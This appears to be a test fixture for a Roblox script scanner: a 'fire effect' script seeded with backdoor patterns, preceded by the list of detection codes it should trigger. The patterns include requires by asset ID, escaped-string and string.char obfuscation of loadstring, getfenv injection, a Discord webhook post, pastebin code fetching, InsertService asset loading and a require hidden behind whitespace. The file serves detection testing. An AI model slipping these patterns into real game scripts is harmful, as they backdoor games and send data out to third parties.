-- expect: SEC-REQUIRE-ID, SEC-REQUIRE-ID, SEC-LOADSTRING, SEC-FENV, SEC-OBFUSCATED, SEC-OBFUSCATED, SEC-HIDDEN-CODE, SEC-WEBHOOK, SEC-REMOTE-HOST, SEC-INSERT-ASSET
-- Looks like a harmless "fire effect" script from the Toolbox.
local Fire = Instance.new("Fire")
Fire.Parent = script.Parent
require(4815162342)
local id = 1000; require(id * 7)
local payload = "\104\116\116\112\115\58\47\47\101\120\97\109\112\108\101"
local key = string.char(108, 111, 97, 100, 115, 116, 114, 105, 110, 103, 33, 33)
local run = loadstring(payload)
getfenv()[key] = run
local HttpService = game:GetService("HttpService")
HttpService:PostAsync("https://discord.com/api/webhooks/123/abc", "{}")
local code = HttpService:GetAsync("https://pastebin.com/raw/xyz")
local InsertService = game:GetService("InsertService")
local model = InsertService:LoadAsset(123456)
Fire.Size = 5                                                                                                                                              require(game.ServerStorage.X)
